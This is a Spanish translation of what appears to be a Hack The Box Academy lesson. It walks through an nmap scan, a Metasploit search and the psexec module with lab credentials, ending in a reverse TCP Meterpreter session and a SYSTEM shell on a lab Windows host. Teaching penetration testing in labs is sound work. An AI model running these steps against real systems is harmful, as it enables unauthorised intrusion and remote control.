[Metasploit](https://www.metasploit.com/) es un framework de ataque automatizado desarrollado por `Rapid7` que agiliza el proceso de explotación de vulnerabilidades mediante el uso de módulos preconstruidos que contienen opciones fáciles de usar para explotar vulnerabilidades y entregar payloads para obtener una shell en un sistema vulnerable. Puede hacer que la explotación de un sistema vulnerable sea tan fácil que algunos proveedores de formación en ciberseguridad limitan cuántas veces se puede usar en exámenes de laboratorio. Aquí en Hack The Box, animamos a experimentar con herramientas en nuestros entornos de laboratorio hasta tener una comprensión sólida. La mayoría de las organizaciones no nos limitarán en cuanto a las herramientas que podemos o no usar en un engagement. Sin embargo, esperarán que sepamos lo que estamos haciendo. Por lo tanto, es nuestra responsabilidad buscar una comprensión a medida que aprendemos. No entender los efectos de las herramientas que usamos puede ser destructivo en una prueba de penetración o auditoría en vivo. Esta es una razón principal por la que debemos buscar consistentemente una comprensión más profunda de las herramientas, técnicas, metodologías y prácticas que aprendemos.

En esta sección, interactuaremos con la `community edition` de Metasploit en Pwnbox. Usaremos módulos preconstruidos y crearemos payloads con `MSFVenom`. Es importante notar que muchas firmas de ciberseguridad establecidas utilizan la edición de pago de Metasploit llamada `Metasploit Pro` para realizar pruebas de penetración, auditorías de seguridad e incluso campañas de ingeniería social. Si deseas explorar las diferencias entre la community edition y Metasploit Pro, puedes consultar este [comparison chart](https://www.rapid7.com/products/metasploit/download/editions/).

---
## Practicing with Metasploit

Podríamos pasar el resto de este módulo cubriendo todo sobre Metasploit, pero solo vamos a trabajar con lo más básico en el contexto de shells & payloads.
Empecemos a trabajar con Metasploit lanzando la consola del framework de Metasploit como root (`sudo msfconsole`).

### Starting MSF

```bash
$ sudo msfconsole 
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > 
```

Podemos ver que hay arte ASCII creativo presentado como banner en el lanzamiento y algunos números de particular interés.

- `2131` exploits
- `592` payloads

Estos números pueden cambiar a medida que los mantenedores agregan y eliminan código o si importas un módulo para usar en Metasploit. Familiaricémonos con los payloads de Metasploit utilizando un `exploit module` clásico que se puede usar para comprometer un sistema Windows. Recuerda que Metasploit se puede usar para más que solo explotación. También podemos usar diferentes módulos para escanear y enumerar objetivos.

En este caso, utilizaremos los resultados de enumeración de un escaneo con `nmap` para elegir un módulo de Metasploit a usar.

### NMAP Scan

```bash
$ nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

En la salida, vemos varios puertos estándar que normalmente están abiertos en un sistema Windows por defecto. Recuerda que escanear y enumerar es una excelente manera de saber qué sistema operativo (Windows o Linux) está ejecutando nuestro objetivo para encontrar un módulo apropiado para ejecutar con Metasploit. Vamos a usar `SMB` (escuchando en `445`) como el vector de ataque potencial.

Una vez que tenemos esta información, podemos usar la funcionalidad de búsqueda de Metasploit para descubrir módulos asociados con SMB. En la `msfconsole`, podemos emitir el comando `search smb` para obtener una lista de módulos asociados con vulnerabilidades de SMB:

### Searching Within Metasploit

```bash
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
```

Veremos una larga lista de `Matching Modules` asociados con nuestra búsqueda. Nota el formato en el que está cada módulo. Cada módulo tiene un número listado en el extremo izquierdo de la tabla para hacer más fácil la selección del módulo,

 un `Name`, `Disclosure Date`, `Rank`, `Check` y `Description`.

El número a la `izquierda` de cada módulo potencial es un número relativo basado en tu búsqueda que puede cambiar a medida que se añaden módulos a Metasploit. No esperes que este número coincida cada vez que realices la búsqueda o intentes usar el módulo.

Veamos un módulo en particular para entenderlo en el contexto de payloads.

`56 exploit/windows/smb/psexec`

|Output|Meaning|
|---|---|
|`56`|El número asignado al módulo en la tabla en el contexto de la búsqueda. Este número hace que sea más fácil seleccionarlo. Podemos usar el comando `use 56` para seleccionar el módulo.|
|`exploit/`|Esto define el tipo de módulo. En este caso, es un exploit module. Muchos exploit modules en MSF incluyen el payload que intenta establecer una sesión shell.|
|`windows/`|Esto define la plataforma que estamos atacando. En este caso, sabemos que el objetivo es Windows, por lo que el exploit y el payload serán para Windows.|
|`smb/`|Esto define el servicio para el cual el payload en el módulo está escrito.|
|`psexec`|Esto define la herramienta que se cargará en el sistema objetivo si es vulnerable.|

Una vez que seleccionamos el módulo, notaremos un cambio en el prompt que nos da la capacidad de configurar el módulo basado en parámetros específicos de nuestro entorno.

### Option Selection

```bash
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > 
```

Nota cómo `exploit` está fuera de los paréntesis. Esto puede interpretarse como el tipo de módulo MSF siendo un exploit, y el exploit específico y el payload están escritos para Windows. El vector de ataque es `SMB`, y el payload Meterpreter será entregado usando [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Aprendamos más sobre el uso de este exploit y la entrega del payload utilizando el comando `options`.

### Examining an Exploit's Options

```bash
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Esta es una área donde Metasploit brilla en términos de facilidad de uso. En la salida de las opciones del módulo, vemos varias opciones y configuraciones con una descripción de lo que significa cada configuración. No usaremos `SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME` y `SERVICE_NAME` en esta sección. Nota cómo este exploit particular usará una conexión reverse TCP shell utilizando `Meterpreter`. Una shell de Meterpreter nos da mucha más funcionalidad que una shell TCP inversa cruda, como establecimos en las secciones anteriores de este módulo. Es el payload predeterminado que se usa en Metasploit.

Usaremos el comando `set` para configurar las siguientes configuraciones de la siguiente manera:

### Setting Options

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Estas configuraciones asegurarán que nuestro payload se entregue al objetivo correcto (`RHOSTS`), se cargue en la share administrativa predeterminada (`ADMIN$`) utilizando credenciales (`SMBPass` & `SMBUser`), y luego inicie una conexión reverse shell con nuestra máquina local (`LHOST`).

Estas configuraciones serán específicas para la dirección IP en tu máquina de ataque y en la máquina objetivo, así como con las credenciales que puedas recopilar en un engagement. Podemos configurar el LHOST (host local) con la dirección IP del túnel VPN o el ID de la interfaz del túnel VPN.

### Exploits Away

```bash
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

Después de emitir el comando `exploit`, se ejecuta el exploit y se intenta entregar el payload en el objetivo utilizando el payload Meterpreter. Metasploit informa de cada paso de este proceso, como se ve en la salida. Sabemos que fue exitoso porque se envió una `stage` con éxito, lo que estableció una sesión shell de Meterpreter (`meterpreter >`) y una sesión shell a nivel del sistema. Ten en cuenta que Meterpreter es un payload que utiliza inyección de DLL en memoria para establecer de manera sigilosa un canal de comunicación entre una máquina de ataque y un objetivo. Las credenciales y el vector de ataque adecuados pueden darnos la capacidad de subir y descargar archivos, ejecutar comandos del sistema, ejecutar un keylogger, crear/iniciar/detener servicios, gestionar procesos y más.

En este caso, como se detalla en la [Rapid 7 Module Documentation](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/): "Este módulo usa un nombre de usuario y contraseña de administrador válidos (o hash de contraseña) para ejecutar un payload arbitrario. Este módulo es similar a la utilidad "psexec" proporcionada por SysInternals. Este módulo ahora es capaz de limpiarse a sí mismo. El servicio creado por esta herramienta usa un nombre y descripción elegidos al azar."

Al igual que otros intérpretes de lenguaje de comandos (Bash, PowerShell, ksh, etc...), las sesiones shell de Meterpreter nos permiten emitir un conjunto de comandos que podemos usar para interactuar con el sistema objetivo. Podemos usar el comando `?` para ver una lista de comandos que podemos usar. Notaremos limitaciones con la shell de Meterpreter, por lo que es bueno intentar usar el comando `shell` para caer en una shell a nivel de sistema si necesitamos trabajar con el conjunto completo de comandos del sistema nativos de nuestro objetivo.

### Interactive Shell

```bash
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

`Now let's put our knowledge to the test with some challenge questions`.